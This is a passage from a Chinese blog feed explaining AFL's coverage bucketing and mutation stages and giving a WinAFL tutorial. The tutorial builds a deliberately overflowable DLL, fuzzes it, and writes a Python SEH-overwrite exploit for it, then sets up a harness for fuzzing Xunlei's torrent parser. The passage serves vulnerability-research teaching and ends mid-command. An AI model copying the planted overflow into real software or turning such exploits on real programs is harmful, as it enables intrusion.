class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">void</span> <span class="title function_">classify_counts</span><span class="params">(u32* mem)</span> &#123;</span><br><span class="line"></span><br><span class="line">  u32 i = MAP_SIZE &gt;&gt; <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> (i--) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Optimize for sparse bitmaps. */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (unlikely(*mem)) &#123;</span><br><span class="line"></span><br><span class="line">      u16* mem16 = (u16*)mem;</span><br><span class="line"></span><br><span class="line">      mem16[<span class="number">0</span>] = count_class_lookup16[mem16[<span class="number">0</span>]];</span><br><span class="line">      mem16[<span class="number">1</span>] = count_class_lookup16[mem16[<span class="number">1</span>]];</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    mem++;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Destructively classify execution counts in a trace. This is used as a</span></span><br><span class="line"><span class="comment">   preprocessing step for any newly acquired traces. Called on every exec,</span></span><br><span class="line"><span class="comment">   must be fast. */</span></span><br><span class="line"><span class="type">static</span> <span class="type">const</span> u8 count_class_lookup8[<span class="number">256</span>] = &#123;</span><br><span class="line"></span><br><span class="line">  [<span class="number">0</span>]           = <span class="number">0</span>,</span><br><span class="line">  [<span class="number">1</span>]           = <span class="number">1</span>,</span><br><span class="line">  [<span class="number">2</span>]           = <span class="number">2</span>,</span><br><span class="line">  [<span class="number">3</span>]           = <span class="number">4</span>,</span><br><span class="line">  [<span class="number">4</span> ... <span class="number">7</span>]     = <span class="number">8</span>,</span><br><span class="line">  [<span class="number">8</span> ... <span class="number">15</span>]    = <span class="number">16</span>,</span><br><span class="line">  [<span class="number">16</span> ... <span class="number">31</span>]   = <span class="number">32</span>,</span><br><span class="line">  [<span class="number">32</span> ... <span class="number">127</span>]  = <span class="number">64</span>,</span><br><span class="line">  [<span class="number">128</span> ... <span class="number">255</span>] = <span class="number">128</span></span><br><span class="line"></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>最重要的是<code>count_class_lookup8</code>，target是将每个分支的执行次数用1个byte来储存，而fuzzer则进一步把这个执行次数归入buckets中，比如执行1次，<code>mem16 = count_class_lookup8[1]; == 1</code></p><p>执行3次<code>mem16 = count_class_lookup8[3]; == 4</code>。执行4次<code>mem16 = count_class_lookup8[4]; == 8</code></p><p>好处就在于分支A执行了32次；对另外一个测试用例，分支A执行了33次，那么AFL就会认为这两次的代码覆盖是相同的。这样通过代码块的执行次数就可以统计相关路径，AFL根据相关路径的HASH判断路径是否发生改变。</p><h1 id="文件变异规则"><a class="markdownIt-Anchor" href="#文件变异规则"></a> 文件变异规则</h1><p>看到好多研究生论文都是从这里下手的。。。</p><ul><li><p>bitflip，按位翻转，1变为0，0变为1</p><p>在对每个byte进行翻转时，如果其造成执行路径与原始路径不一致，就将该byte在effector map中标记为1，即“有效”的，否则标记为0，即“无效”的</p></li><li><p>arithmetic，整数加/减算术运算</p><p>对目标整数会进行+1, +2, …, +35, -1, -2, …, -35的变异。特别地，由于整数存在大端序和小端序两种表示方式，AFL会贴心地对这两种整数表示方式都进行变异。</p></li><li><p>interest，把一些特殊内容替换到原文件中</p><p>用于替换的&quot;interesting values&quot;，是AFL预设的一些比较特殊的数。</p><p><code>config.h</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> INTERESTING_8 \</span></span><br><span class="line"><span class="meta">  -128,          <span class="comment">/* Overflow signed 8-bit when decremented  */</span> \</span></span><br><span class="line"><span class="meta">  -1,            <span class="comment">/*                                         */</span> \</span></span><br><span class="line"><span class="meta">   0,            <span class="comment">/*                                         */</span> \</span></span><br><span class="line"><span class="meta">   1,            <span class="comment">/*                                         */</span> \</span></span><br><span class="line"><span class="meta">   16,           <span class="comment">/* One-off with common buffer size         */</span> \</span></span><br><span class="line"><span class="meta">   32,           <span class="comment">/* One-off with common buffer size         */</span> \</span></span><br><span class="line"><span class="meta">   64,           <span class="comment">/* One-off with common buffer size         */</span> \</span></span><br><span class="line"><span class="meta">   100,          <span class="comment">/* One-off with common buffer size         */</span> \</span></span><br><span class="line"><span class="meta">   127           <span class="comment">/* Overflow signed 8-bit when incremented  */</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> INTERESTING_16 \</span></span><br><span class="line"><span class="meta">  -32768,        <span class="comment">/* Overflow signed 16-bit when decremented */</span> \</span></span><br><span class="line"><span class="meta">  -129,          <span class="comment">/* Overflow signed 8-bit                   */</span> \</span></span><br><span class="line"><span class="meta">   128,          <span class="comment">/* Overflow signed 8-bit                   */</span> \</span></span><br><span class="line"><span class="meta">   255,          <span class="comment">/* Overflow unsig 8-bit when incremented   */</span> \</span></span><br><span class="line"><span class="meta">   256,          <span class="comment">/* Overflow unsig 8-bit                    */</span> \</span></span><br><span class="line"><span class="meta">   512,          <span class="comment">/* One-off with common buffer size         */</span> \</span></span><br><span class="line"><span class="meta">   1000,         <span class="comment">/* One-off with common buffer size         */</span> \</span></span><br><span class="line"><span class="meta">   1024,         <span class="comment">/* One-off with common buffer size         */</span> \</span></span><br><span class="line"><span class="meta">   4096,         <span class="comment">/* One-off with common buffer size         */</span> \</span></span><br><span class="line"><span class="meta">   32767         <span class="comment">/* Overflow signed 16-bit when incremented */</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> INTERESTING_32 \</span></span><br><span class="line"><span class="meta">  -2147483648LL, <span class="comment">/* Overflow signed 32-bit when decremented */</span> \</span></span><br><span class="line"><span class="meta">  -100663046,    <span class="comment">/* Large negative number (endian-agnostic) */</span> \</span></span><br><span class="line"><span class="meta">  -32769,        <span class="comment">/* Overflow signed 16-bit                  */</span> \</span></span><br><span class="line"><span class="meta">   32768,        <span class="comment">/* Overflow signed 16-bit                  */</span> \</span></span><br><span class="line"><span class="meta">   65535,        <span class="comment">/* Overflow unsig 16-bit when incremented  */</span> \</span></span><br><span class="line"><span class="meta">   65536,        <span class="comment">/* Overflow unsig 16 bit                   */</span> \</span></span><br><span class="line"><span class="meta">   100663045,    <span class="comment">/* Large positive number (endian-agnostic) */</span> \</span></span><br><span class="line"><span class="meta">   2147483647    <span class="comment">/* Overflow signed 32-bit when incremented */</span></span></span><br></pre></td></tr></table></figure></li><li><p>dictionary，把自动生成或用户提供的token替换/插入到原文件中（从头开始）</p><p><code>-x</code>选项设置的token</p></li><li><p>havoc，中文意思是“大破坏”，此阶段会对原文件进行大量变异，具体见下文</p><p>开始智力下降，我在fuzz中看到的大多数都是这个阶段（阿巴阿巴）</p><ul><li>随机选取某个bit进行翻转</li><li>随机选取某个byte，将其设置为随机的interesting value</li><li>随机选取某个word，并随机选取大、小端序，将其设置为随机的interesting value</li><li>随机选取某个dword，并随机选取大、小端序，将其设置为随机的interesting value</li><li>随机选取某个byte，对其减去一个随机数</li><li>随机选取某个byte，对其加上一个随机数</li><li>随机选取某个word，并随机选取大、小端序，对其减去一个随机数</li><li>随机选取某个word，并随机选取大、小端序，对其加上一个随机数</li><li>随机选取某个dword，并随机选取大、小端序，对其减去一个随机数</li><li>随机选取某个dword，并随机选取大、小端序，对其加上一个随机数</li><li>随机选取某个byte，将其设置为随机数</li><li>随机删除一段bytes</li><li>随机选取一个位置，插入一段随机长度的内容，其中75%的概率是插入原文中随机位置的内容，25%的概率是插入一段随机选取的数</li><li>随机选取一个位置，替换为一段随机长度的内容，其中75%的概率是替换成原文中随机位置的内容，25%的概率是替换成一段随机选取的数</li><li>随机选取一个位置，用随机选取的token（用户提供的或自动生成的）替换</li><li>随机选取一个位置，用随机选取的token（用户提供的或自动生成的）插入</li></ul></li><li><p>splice，中文意思是“绞接”，此阶段会将两个文件拼接起来得到一个新的文件</p><p>splice是将两个seed文件拼接得到新的文件，并对这个新文件继续执行havoc变异</p></li><li><p>cycle：对队列所有文件全部按照上面的步骤来一遍就算完成了一个cycle，整个队列又会从第一个文件开始，再次进行变异，不过与第一次变异不同的是，这一次就不需要再进行deterministic fuzzing了。</p></li></ul><h1 id="参考"><a class="markdownIt-Anchor" href="#参考"></a> 参考</h1><p><a href="https://paper.seebug.org/496/">https://paper.seebug.org/496/</a></p><p><a href="https://github.com/google/AFL">https://github.com/google/AFL</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;其实还是挺简单的&lt;/p&gt;</summary>
    
    
    
    <category term="notes" scheme="https://joe1sn.eu.org/categories/notes/"/>
    
    
    <category term="source" scheme="https://joe1sn.eu.org/tags/source/"/>
    
    <category term="AFL" scheme="https://joe1sn.eu.org/tags/AFL/"/>
    
  </entry>
  
  <entry>
    <title>【漏洞挖掘】win-afl使用指北-中级篇</title>
    <link href="https://joe1sn.eu.org/2023/07/19/win-afl2/"/>
    <id>https://joe1sn.eu.org/2023/07/19/win-afl2/</id>
    <published>2023-07-19T14:06:52.000Z</published>
    <updated>2023-07-21T03:32:53.355Z</updated>
    
    <content type="html"><![CDATA[<p>为什么不叫高级篇，因为高级的我也不会</p><p>主要讲一下更贴近实际的用法吧</p><p>!!!仅大标题1完成，全片未完待续!!!</p><span id="more"></span><h1 id="对dll进行fuzz"><a class="markdownIt-Anchor" href="#对dll进行fuzz"></a> 对DLL进行Fuzz</h1><h2 id="理论测试"><a class="markdownIt-Anchor" href="#理论测试"></a> 理论测试</h2><p>代码还是上一篇提到的代码，依旧是32位，只不过溢出部分写在DLL里面</p><p><code>dll.c</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">__declspec(dllexport) <span class="type">void</span> <span class="title function_">vuln</span><span class="params">(<span class="type">char</span> *FileDir)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">char</span> password[<span class="number">6</span>] = <span class="string">&quot;ABCDE&quot;</span>;</span><br><span class="line"><span class="type">char</span> str[<span class="number">6</span>];</span><br><span class="line">FILE *fp;</span><br><span class="line"><span class="keyword">if</span>(!(fp=fopen(FileDir,<span class="string">&quot;r&quot;</span>)))&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Open Failed\n&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line">fgets(str, <span class="number">0x1000</span>, fp);</span><br><span class="line"></span><br><span class="line">str[<span class="number">5</span>]=<span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">strcmp</span>(str,password)==<span class="number">0</span>)</span><br><span class="line"><span class="comment">// fprintf(stderr,&quot;OK.\n&quot;);</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;OK.\n&quot;</span>);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="comment">// fprintf(stderr,&quot;NO.\n&quot;);</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;NO.\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -shared -o mydll.dll dll.c</span><br></pre></td></tr></table></figure><p><code>main.c</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">__declspec(dllimport) <span class="type">void</span> <span class="title function_">vuln</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (argc != <span class="number">2</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Usage: ./HelloWorld.exe FileName\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">vuln(argv[<span class="number">1</span>]);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -o main main.c mydll.dll</span><br></pre></td></tr></table></figure><p>不想联合编译的话也可以使用<code>GetProAddress</code>来编写如下harness</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">DWORD</span><span class="params">(__cdecl *pvuln)</span><span class="params">(<span class="type">char</span>* aFileName)</span>;</span><br><span class="line">pvuln vuln = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> __declspec(dllexport) <span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">char</span> mydll_path[] = <span class="string">&quot;D:\\HackTools\\Fuzz\\WinAFLFuzz\\testcase\\dll\\mydll.dll&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (argc != <span class="number">2</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Usage: ./HelloWorld.exe FileName\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> HMODULE hMyDLL = <span class="literal">NULL</span>;</span><br><span class="line">hMyDLL = LoadLibraryA(mydll_path);</span><br><span class="line"><span class="keyword">if</span>(hMyDLL == <span class="literal">NULL</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Load DLL Failed\n&quot;</span>);</span><br><span class="line"><span class="keyword">goto</span> END;</span><br><span class="line">&#125;</span><br><span class="line">vuln = (pvuln)GetProcAddress(hMyDLL,<span class="string">&quot;vuln&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(vuln == <span class="literal">NULL</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Get Process Address Failed\n&quot;</span>);</span><br><span class="line"><span class="keyword">goto</span> END;</span><br><span class="line">&#125;</span><br><span class="line">vuln(argv[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">END:</span><br><span class="line"><span class="keyword">if</span>(hMyDLL)&#123;</span><br><span class="line">FreeLibrary(hMyDLL);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>开始插桩看看</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">D:\HackTools\Fuzz\__FuzzWork\dynamorio\build_Win32\bin32\drrun.exe ^</span><br><span class="line">-c D:\HackTools\Fuzz\__FuzzWork\winafl\build_Win32\bin\Release\winafl.dll -debug ^</span><br><span class="line">-debug ^</span><br><span class="line">-coverage_module mydll.dll ^</span><br><span class="line">-target_module main.exe ^</span><br><span class="line">-target_offset 0x16B0 ^</span><br><span class="line">-fuzz_iterations 10 -nargs 2 -- ^</span><br><span class="line">main.exe .\in\password.txt</span><br></pre></td></tr></table></figure><p>开始fuzz</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">afl-fuzz.exe ^</span><br><span class="line">-i .\in ^</span><br><span class="line">-o .\out ^</span><br><span class="line">-D &quot;D:\HackTools\Fuzz\__FuzzWork\dynamorio\build_Win32\bin32&quot; ^</span><br><span class="line">-I 100000+ -t 90000+ -- ^</span><br><span class="line">-coverage_module mydll.dll ^</span><br><span class="line">-target_module main.exe ^</span><br><span class="line">-target_offset 0x16B0 ^</span><br><span class="line">-fuzz_iterations 5000 -nargs 2 -- ^</span><br><span class="line">main.exe @@</span><br></pre></td></tr></table></figure><p>瞬间找到crash</p><p><img src="https://img.joe1sn.top/uploads/big/daaf8adb1d017be8d9a2cfe663b3e31e.png" alt="image-20230719223344759" /></p><p>样本长这样</p><p><img src="https://img.joe1sn.top/uploads/big/54e297bf0dc0db9abedc7f7a9dde0eb7.png" alt="image-20230719223644693" /></p><p>这次尝试使用x32dbg分析</p><p><img src="https://img.joe1sn.top/uploads/big/d7671aece307bb7bea07693d3ee10c34.png" alt="image-20230719223859881" /></p><p>得到EXP</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">b&quot;&quot;</span></span><br><span class="line">shellcode = <span class="string">b&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">offset = <span class="string">b&quot;A&quot;</span>*(<span class="number">0x12c</span>-<span class="built_in">len</span>(shellcode)-<span class="number">32</span>) <span class="comment">#0x1c</span></span><br><span class="line">NSEH = <span class="string">b&quot;\xeb\x06\x90\x90&quot;</span>      <span class="comment">#asm(&quot;jmp 6;nop;nop&quot;)</span></span><br><span class="line">gadget = <span class="string">b&quot;\xEA\x23\x40\x00&quot;</span>    <span class="comment">#004023EA</span></span><br><span class="line">self_gadget = <span class="string">b&quot;\x89\xE0\x05\x24\x06\x00\x00\xFF\xE0&quot;</span><span class="comment"># mov eax, esp</span></span><br><span class="line">                                                        <span class="comment"># sub eax, 0x608</span></span><br><span class="line">                                                        <span class="comment"># jmp eax</span></span><br><span class="line">payload = <span class="string">b&quot;\xaa&quot;</span>*<span class="number">32</span>+shellcode+offset+NSEH+gadget+self_gadget</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;password.txt&quot;</span>,<span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(payload)</span><br></pre></td></tr></table></figure><p><img src="https://img.joe1sn.top/uploads/big/2b31205d967b4cbe010d72e2fa611249.png" alt="image-20230719224736838" /></p><p>要点就是：<strong>Fuzz的时候和插桩的时候加上<code>-coverage_module &lt;你的dll&gt;</code></strong></p><h2 id="实际测试"><a class="markdownIt-Anchor" href="#实际测试"></a> 实际测试</h2><p>你已经学会了1+1=2，请证明费马大定理吧，为了统一和方便，这里也用看雪里面的一篇文章</p><p><a href="https://bbs.kanxue.com/thread-265958.htm">使用winafl对迅雷的torrent解析逻辑进行fuzz </a></p><p>首先是找到合适的软件，然后知道他那个功能是在那个dll中的，你可以使用<code>ProcessMonitor</code>查看（俗称<code>procmon</code>），截图没有，特征就是当你打开一个<code>.torrent</code>文件后，<code>thunder.exe</code>会马上加载<code>AssisstantTools.dll</code>。通过查看导出表可以找到一些可以测试的函数，这里我测试的是<code>XL_ParseTorrentFile</code></p><img src="https://img.joe1sn.top/uploads/big/445b9aecbc3b84a5f61ac18ff7ca2b78.png" alt="image-20230721110915736" style="zoom:50%;" /><p>查看导入表可以看到依赖的<code>P2PBase.dll</code></p><img src="https://img.joe1sn.top/uploads/big/ee4fca4ffb70d73f4b43d937125d366a.png" alt="image-20230721111002412" style="zoom:50%;" /><p>所以fuzz的时候也要加上，开始编写harness，你可以用那篇文章里面的，但是我这里就很慢，<br />原文文章中的harness由于<code>using</code>附近的代码只在<code>c++11</code>中支持，所以使用gcc编译报错的可以尝试加上<code>-std=c++11</code><br />如果你使用的是下面我编写的harness，那么直接编译就可以了</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">DWORD</span><span class="params">(__cdecl *pXL_ParseTorrentFile)</span><span class="params">(CHAR* aFileName, PVOID* a1)</span></span>;</span><br><span class="line">pXL_ParseTorrentFile XL_ParseTorrentFile = <span class="literal">NULL</span>;</span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">DWORD</span><span class="params">(__cdecl *pXL_ReleaseTorrentFileInfo)</span><span class="params">(PVOID a1)</span></span>;</span><br><span class="line">pXL_ReleaseTorrentFileInfo XL_ReleaseTorrentFileInfo = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> __declspec(dllexport) <span class="function"><span class="type">void</span> <span class="title">fuzz_method</span><span class="params">(<span class="type">char</span> *FilePath)</span></span>&#123;</span><br><span class="line">    PVOID a1 = <span class="literal">NULL</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">XL_ParseTorrentFile</span>(FilePath, &amp;a1);</span><br><span class="line">    <span class="keyword">if</span> (a1)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">XL_ReleaseTorrentFileInfo</span>(a1);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//char AssisstantToolsPath[] = &quot;D:\\HackTools\\Fuzz\\WinAFLFuzz\\testcase\\thunder_fuzzer\\a.dll&quot;;</span></span><br><span class="line"><span class="keyword">if</span> (argc != <span class="number">2</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Usage: ./HelloWorld.exe FileName\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">static</span> HMODULE hMyDLL = <span class="literal">NULL</span>;</span><br><span class="line">hMyDLL = <span class="built_in">LoadLibraryA</span>(<span class="string">&quot;AssistantTools.dll&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(hMyDLL == <span class="literal">NULL</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Load DLL Failed\n&quot;</span>);</span><br><span class="line"><span class="keyword">goto</span> END;</span><br><span class="line">&#125;</span><br><span class="line">XL_ParseTorrentFile = (pXL_ParseTorrentFile)<span class="built_in">GetProcAddress</span>(hMyDLL, <span class="string">&quot;XL_ParseTorrentFile&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(XL_ParseTorrentFile == <span class="literal">NULL</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Get Process Address Failed\n&quot;</span>);</span><br><span class="line"><span class="keyword">goto</span> END;</span><br><span class="line">&#125;</span><br><span class="line">XL_ReleaseTorrentFileInfo = (pXL_ReleaseTorrentFileInfo)<span class="built_in">GetProcAddress</span>(hMyDLL, <span class="string">&quot;XL_ReleaseTorrentFileInfo&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(XL_ReleaseTorrentFileInfo == <span class="literal">NULL</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Get Process Address Failed\n&quot;</span>);</span><br><span class="line"><span class="keyword">goto</span> END;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fuzz_method</span>(argv[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">END:</span><br><span class="line"><span class="keyword">if</span>(hMyDLL)&#123;</span><br><span class="line"><span class="built_in">FreeLibrary</span>(hMyDLL);</span><br><span class="line">&#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Done\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>你可以用<code>drrun -t drcov --</code>来测试看是不是使用成功，之后使用<code>drrun</code>测试</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&quot;D:\HackTools\Fuzz\__FuzzWork\dynamorio\build_Win32\bin32\drrun.exe&quot; ^</span><br><span class="line">-c winafl.dll -debug ^</span><br><span class="line">-coverage_module P2PBase.dll ^</span><br><span class="line">-coverage_module AssistantTools.dll ^</span><br><span class="line">-target_module fuzz_program.exe ^</span><br><span class="line">-target_offset 0x11ef ^</span><br><span class="line">-fuzz_iterations 10 -nargs 2 ^</span><br><span class="line">-- fuzz_program.exe 